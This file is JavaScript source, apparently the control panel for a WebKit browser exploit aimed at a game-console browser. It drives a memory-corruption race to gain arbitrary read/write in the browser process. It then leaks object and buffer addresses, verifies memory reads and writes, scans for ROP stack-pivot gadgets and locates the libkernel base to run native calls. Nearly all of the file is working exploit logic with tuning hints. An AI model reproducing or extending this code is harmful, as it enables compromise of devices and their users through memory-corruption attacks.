    nativeQuiet = false;
    lkQuiet = false;
    nativeStaged = false;
    busy = false;

    if (kind === "smoke" && !errMsg) {
        mark("NATIVE-OK", "pivot smoke (manual) build=" + BUILD_ID);
        state("pivot OK — lk not the issue", "ok");
    } else if (kind.startsWith("usleep") && !errMsg) {
        mark("NATIVE-OK", kind + " lk=" + lk + " (atomic) build=" + BUILD_ID);
        state("usleep OK — native call works", "ok");
        try {
            saveLibkernelSession(lk, null, { forced: true });
            crashLog.append("NATIVE-OK " + kind, "NATIVE-OK");
        } catch (_) { }
    } else if (!kind.startsWith("usleep") && pid > 0) {
        mark("NATIVE-OK", "getpid=" + pid + " build=" + BUILD_ID);
        state("getpid OK pid=" + pid, "ok");
    } else {
        mark("NATIVE-FAIL", (errMsg || "fire failed") + " build=" + BUILD_ID);
        mark("NATIVE-HINT", "pivot OOM — tap Verify pivot, fix PIVOT-BAD lines before Fire smoke");
        state("native fire failed", "bad");
    }
    lkHot = false;
    pivotReady = true;
    setUi();
    renderOut();
    try { crashLog.flushSync(); } catch (_) { }
}

async function doNativeCallImmediate() {
    runFireGetpid();
}

async function freeBeforeNative() {
    retained.length = 0;
    pointers.length = 0;
    raceBuf.length = 0;
    nativeStaged = false;
    if (lines.length > 8) lines.splice(0, lines.length - 8);
    if (mapBody) mapBody.innerHTML = "";
    if (outEl) outEl.textContent = lines.join("\n");
    exploit = null;
}

function seedNativeSession(p, off) {
    const fn = captureNativeFnQuick(p, off);
    if (fn) {
        const base = resolveWebkitBase(off, fn);
        persistSessionBases(fn, base, base ? { trust: "rw" } : undefined);
    }
    return fn;
}

async function runRwProofManual() {
    if (busy || !ready || !window.p) return;
    busy = true;
    setUi();
    try {
        pointers.length = 0;
        renderMap();
        const ok = await runRwProof(window.p, loadEffectiveOff());
        mark(ok ? "PASS" : "WARN", "RW proof map done — " + pointers.length + " ptrs");
        state(ok ? "RW proof OK" : "RW proof partial", ok ? "ok" : "warn");
    } finally {
        busy = false;
        setUi();
    }
}

async function runNativeCall() {
    runFireGetpid();
}

async function loadExploit() {
    if (exploit) return exploit;
    mark("LOAD", "core.js + mem.js");
    const core = await import("./core.js");
    exploit = {
        establishPrimitive: core.establishPrimitive,
        installWindowP,
    };
    return exploit;
}

function attemptCap() {
    if (!params.has("attempts")) return 0;
    const n = parseInt(params.get("attempts"), 10);
    return n > 0 ? n : 0;
}

function onRaceEvent(tag, detail) {
    if (!CORE_LOG.test(tag)) return;
    mark(tag, detail || "");

    if (tag === "ATTEMPT-START") {
        raceAttempt++;
        state("race attempt " + raceAttempt + "…", "warn");
        if (raceAttempt === 15 || raceAttempt === 30 || raceAttempt === 50)
            mark("HINT-GROOM", "still missing? close browser fully → reload → tap 512 or max groom");
    }

    if (/COMPOSITION-LENGTH-MISS|SSV-PLACEMENT-MISS|ZERO-HEADER-MISS/.test(tag)) {
        lengthMissStreak++;
        if (lengthMissStreak === 8 || lengthMissStreak === 20)
            mark("HINT-GROOM", "COMPOSITION-LENGTH-MISS = race lost — tap 512 drain or max groom, close browser, reload");
    }

    if (tag === "READ-PRIMITIVE-PASS" || tag === "PRIMITIVE-OK")
        lengthMissStreak = 0;
}

async function establishOnce(establishPrimitive) {
    raceAttempt = 0;
    lengthMissStreak = 0;
    raceBuf.length = 0;
    raceMode = true;
    const cap = attemptCap();
    try {
        return await establishPrimitive({
            maxAttempts: cap,
            skipTrimDebris: true,
            onEvent: (t, d, a) => onRaceEvent(t, (a != null ? "[" + a + "] " : "") + (d || ""))
        });
    } finally {
        raceMode = false;
        for (let i = 0; i < raceBuf.length; i++) {
            const line = raceBuf[i];
            const tag = line.split(/\s/)[0];
            if (/FAIL|ERROR|GIVE-UP|READ-PRIMITIVE|TRIM|PRIMITIVE|PAIR|HINT/i.test(tag)) {
                let dup = false;
                for (let j = 0; j < lines.length; j++) {
                    if (lines[j] === line) { dup = true; break; }
                }
                if (!dup) lines.push(line);
            }
        }
        crashLog.appendMany(raceBuf);
        raceBuf.length = 0;
        if (lines.length > LOG_MAX) lines.splice(0, lines.length - LOG_MAX);
        crashLog.flushSync();
        renderOut();
    }
}

function bufAddr(p, off, ab) {
    const cell = walkCell(p, "ArrayBuffer", ab);
    const impl = read8p(p, cell.add32(off.wk_ArrayBuffer_m_impl));
    if (!impl) return null;
    addPtr("ArrayBuffer impl", impl, "+0x" + off.wk_ArrayBuffer_m_impl.toString(16));
    const data = read8p(p, impl.add32(off.wk_ArrayBuffer_m_contents_m_data));
    if (data) addPtr("ArrayBuffer backing", data, "m_contents.m_data");
    return data;
}

async function runRwProof(p, off) {
    const boxA = { tag: "demoA", n: 1 };
    const boxB = { tag: "demoB", n: 2 };
    walkCell(p, "JSObject A", boxA);
    walkCell(p, "JSObject B", boxB);

    const rowA = pointers.filter(x => x.label === "JSObject A cell").pop();
    const rowB = pointers.filter(x => x.label === "JSObject B cell").pop();
    const addrA = rowA ? parseAddr(String(rowA.addr).replace(/^0x/i, "")) : null;
    const addrB = rowB ? parseAddr(String(rowB.addr).replace(/^0x/i, "")) : null;

    const okLeak = addrA && addrB && !same64(addrA, addrB) && addrA.low !== 0;
    mark(okLeak ? "PASS" : "FAIL", "leakval-distinct  a=" + addrA + " b=" + addrB);

    const headerA = okLeak ? p.read8(addrA) : null;
    if (headerA) {
        p.write8(addrA, headerA);
    }
    const okHdr = headerA && same64(p.read8(addrA), headerA);
    mark(okHdr ? "PASS" : "FAIL", "read8-write8 header roundtrip");

    const probe = new ArrayBuffer(0x20);
    retained.push(probe);
    const view = new Uint32Array(probe);
    view[0] = 0xcafebabe;

    if (off) {
        const dataPtr = bufAddr(p, off, probe);
        if (!dataPtr) {
            mark("FAIL", "arraybuffer backing chain");
        } else {
            const got = read4p(p, dataPtr);
            const okR = got === 0xcafebabe;
            mark(okR ? "PASS" : "FAIL", "arraybuffer-read4  got=0x"
                + (got == null ? "null" : got.toString(16)));
            if (okR) {
                p.write4(dataPtr, new int64(0x600dbabe, 0));
                mark(view[0] === 0x600dbabe ? "PASS" : "FAIL", "arraybuffer-write4");
            }
        }
        captureNativeChain(p, off.wk_JSFunction_m_function || 0x28, off);
    }

    try { walkCell(p, "parseFloat", parseFloat); } catch (_) { }
    try { walkCell(p, "Object proto", Object); } catch (_) { }

    addPairStatusPtrs();
    renderMap();
    mark("ADDR-LIST", pointers.length + " pointers logged above");

    return okLeak && okHdr;
}

async function runStart() {
    if (busy || ready) return;
    busy = true;
    setUi();
    raceBuf.length = 0;
    crashLog.sessionMarker("START");
    if (outEl) renderOut();
    pointers.length = 0;
    renderMap();

    const detected = offsetsFor(navigator.userAgent);
    mark("UA-FW", detected.key || "unknown");
    state("getting primitive…", "warn");

    try {
        const { establishPrimitive, installWindowP: installP } = await loadExploit();
        let carrier;
        try {
            carrier = await establishOnce(establishPrimitive);
        } catch (err) {
            if (/gave up/i.test(String(err.message))) {
                mark("HINT-GROOM", "race lost — close browser fully, reload, tap 512 or max groom, Start again");
            }
            throw err;
        }

        installP(carrier, {
            promote: PROMOTE_PAIR,
            onEvent: (t, d) => {
                if (/PAIR|TRIM|RELEASE|FAIL|ERROR/i.test(t))
                    mark(t, d || "");
            },
        });
        window._wkCarrier = carrier;
        const p = window.p;
        if (!p) throw new Error("window.p missing");
        saveTextareaSession(p, carrier);

        nativeAllowed = pairStatus.state !== "broken";
        mark("PRIMITIVE-OK", "arb rw live");
        pivotReady = true;
        const off = loadEffectiveOff();
        try {
            ensureNativePrep(p, off);
            mark("NATIVE-PREP", "slab ready @ Start build=" + BUILD_ID + " native=" + getNativeMode());
            mark("PREP-PIN", "bisect N0 or N2→N5 skip N1 — hook=" + pivotHookMode()
                + " bufAddr=" + (nativePrep._bufAddrOff && nativePrep._bufAddrOff.via || "?"));
            if (params.get("smoke") === "1" && nativeAllowed && getNativeMode() === "smoke") {
                mark("SMOKE-NOW", "atomic smoke @ PRIMITIVE-OK (?smoke=1)");
                renderOut();
                try {
                    firePivotSmoke(p, nativePrep, off, nativeFireOpts(pivotHookMode()));
                    mark("NATIVE-OK", "smoke @ PRIMITIVE-OK build=" + BUILD_ID);
                    state("pivot smoke OK @ Start", "ok");
                } catch (smokeErr) {
                    mark("NATIVE-FAIL", "smoke @ Start: " + (smokeErr.message || smokeErr));
                }
            } else {
                tryNativeFireAtStart(p, off);
            }
        } catch (prepErr) {
            mark("NATIVE-PREP-SKIP", prepErr.message || String(prepErr));
        }
        renderOut();
        mark("HINT", "2e Leak+lk → Fire notify (Collator) — or legacy Verify pivot for expm1");
        mark("PAIR-STATUS", "state=" + pairStatus.state
            + " promoted=" + pairStatus.promoted);
        ready = true;
        ensureUiVisible();
        state("primitive OK — 2e lk then Fire notify", "ok");
    } catch (err) {
        state("failed: " + err.message, "bad");
        mark("ERROR", err.stack || err.message);
    } finally {
        busy = false;
        setUi();
    }
}

function refreshMap() {
    runRwProofManual();
}

function reportErr(err) {
    const msg = err && err.message ? err.message : String(err);
    state("error: " + msg, "bad");
    mark("ERROR", err && err.stack ? err.stack : msg);
}

function wireClick(el, fn) {
    if (!el) return;
    el.addEventListener("click", function () {
        try {
            const r = fn();
            if (r && typeof r.then === "function")
                r.catch(reportErr);
        } catch (err) {
            reportErr(err);
        }
    });
}

function init() {
    outEl = $("out");
    stateEl = $("state");
    mapBody = $("map-body");
    hexEl = $("hex");
    pickPtr = $("pick-ptr");
    addrIn = $("addr-in");
    nativeModeSel = $("native-mode");
    btnStart = $("btn-start");
    btnSaveBases = $("btn-save-bases");
    btnRwProof = $("btn-rw-proof");
    btnNative = $("btn-native");
    btnLoadCal = $("btn-load-cal");
    btnCalcFn = $("btn-calc-fn");
    btnForceLk = $("btn-force-lk");
    btnAcceptFn = $("btn-accept-fn");
    btnOneReadLk = $("btn-one-read-lk");
    btnTryBillZaiLk = $("btn-try-billzai-lk");
    btnGuessLk = $("btn-guess-lk");
    btnPsfreeLite = $("btn-psfree-lite");
    btnPsfreeLk = $("btn-psfree-lk");
    btnPsfreeStop = $("btn-psfree-stop");
    btnVerifyPivot = $("btn-verify-pivot");
    btnScanPivot = $("btn-scan-pivot");
    btnScanPivotFull = $("btn-scan-pivot-full");
    btnPeek = $("btn-peek");
    btnClear = $("btn-clear");

    if (!outEl || !btnStart) {
        state("UI missing — open via HTTP(S), not file://", "bad");
        return;
    }

    wireGadgetBars();
    wireG5Bar();
    wireNativeBisectBar();
    ensureUiVisible();
    wireClick(btnStart, function () { return runStart(); });
    wireClick(btnSaveBases, saveBasesManual);
    wireClick(btnRwProof, function () { return runRwProofManual(); });
    wireClick(btnVerifyPivot, verifyPivotManual);
    wireClick(btnScanPivot, function () { return runPivotScanAuto(); });
    wireClick(btnScanPivotFull, function () { return runPivotFullScanAuto(); });
    wireClick(btnNative, function () { return runNativeCall(); });
    wireClick(btnLoadCal, function () { runTryCalPtrs(); });
    wireClick(btnCalcFn, function () { runCalcFn(); });
    wireClick(btnOneReadLk, runOneReadLk);
    wireClick(btnForceLk, function () { acceptLkFromHex(null); });
    wireClick(btnAcceptFn, function () { acceptFnFromHex(null); });
    wireClick(btnTryBillZaiLk, function () { runManualTest("try-billzai-lk"); });
    wireClick(btnGuessLk, function () { runGuessLk(); });
    wireClick(btnPsfreeLite, function () { return runFindLkAuto(FIND_LK_LITE); });
    wireClick(btnPsfreeLk, function () { return runFindLkAuto(FIND_LK_NORM); });
    wireClick(btnPsfreeStop, function () { stopFindLk(); });
    wireClick(btnClear, function () {
        lines.length = 0;
        clearPersistedLog();
        if (outEl) outEl.textContent = "";
        mark("LOG-CLEAR", "sessionStorage log cleared");
    });
    wireClick(btnPeek, function () {
        const a = parseAddr(addrIn.value);
        if (!a) { mark("PEEK-FAIL", "bad hex"); return; }
        peekAt(a);
    });

    if (nativeModeSel) {
        try {
            const saved = sessionStorage.getItem(SS_NATIVE_MODE);
            if (saved) nativeModeSel.value = saved;
        } catch (_) { }
        nativeModeSel.addEventListener("change", function () {
            setNativeMode(nativeModeSel.value);
            mark("NATIVE-MODE", getNativeMode());
            setUi();
            renderOut();
        });
    }

    if (pickPtr) {
        pickPtr.addEventListener("change", function () {
            const i = parseInt(pickPtr.value, 10);
            if (!(i >= 0) || !pointers[i]) return;
            addrIn.value = pointers[i].addr.replace(/^0x/i, "");
        });
    }

    if (params.get("clearpivot") === "1") {
        try {
            sessionStorage.removeItem("wk-pivot-scan-state");
            sessionStorage.removeItem("wk-scanned-pivot");
            sessionStorage.removeItem("wk-scanned-pivot-base");
        } catch (_) { }
    }
    if (sanitizeScannedPivotStorage())
        mark("PIVOT-FIX", "removed poisoned G0-G4 scan RVAs from session");

    const g5raw = params.get("g5");
    if (g5raw) {
        const g5rva = parseInt(String(g5raw).replace(/^0x/i, ""), 16);
        if (g5rva > 0) {
            const found = loadScannedPivot() || Object.assign({}, PIVOT_HW_1352);
            found.wk_PUSH_RDX_POP_RSP_RET = g5rva;
            try { sessionStorage.setItem("wk-scanned-pivot", JSON.stringify(found)); } catch (_) { }
            mark("G5-MANUAL", "+0x" + g5rva.toString(16) + " from ?g5= URL");
        }
    }

    const lkParam = params.get("lk");
    if (lkParam) {
        if (addrIn) addrIn.value = lkParam.replace(/^0x/i, "");
        acceptLkFromHex(lkParam.replace(/^0x/i, ""));
    } else {
        if (clearStaleLkOnReload())
            mark("LK-FRESH", "cleared stale lk — ASLR rotates each reload");
        try {
            const savedFn = sessionStorage.getItem("wk-lastFnPtr");
            if (savedFn && addrIn && !addrIn.value)
                addrIn.value = savedFn.replace(/^0x/i, "");
        } catch (_) { }
        mark("LK-HINT", "paste k_usleep fn → Accept fn — or 16KB lk → Accept lk → Start");
    }

    if (params.get("clearlog") === "1") clearPersistedLog();
    else crashLog.restoreInto(lines);

    crashLog.startAutoFlush();
    mark("BOOT", "build=" + BUILD_ID + " — logs persist across reload/crash");
    mark("BOOT", "LK-PROBE line shows dynamic parse status");
    mark("BOOT", groomBootLine(params));
    replayHuntTrace();
    window.addEventListener("beforeunload", function () {
        stopPivotScanQuiet();
        if (stateEl) crashLog.persistState(stateEl.textContent, stateEl.className, true);
        crashLog.flushSync();
        if (nativeChain) try { nativeChain.disarm(); } catch (_) { }
    });
    wireGroomBar(() => busy);
    setUi();
    renderOut();
    state("Start → 2e lk → Fire notify", "");
}

function bootUi() {
    try {
        init();
    } catch (err) {
        reportErr(err);
    }
}

if (document.readyState === "loading")
    document.addEventListener("DOMContentLoaded", bootUi);
else
    bootUi();
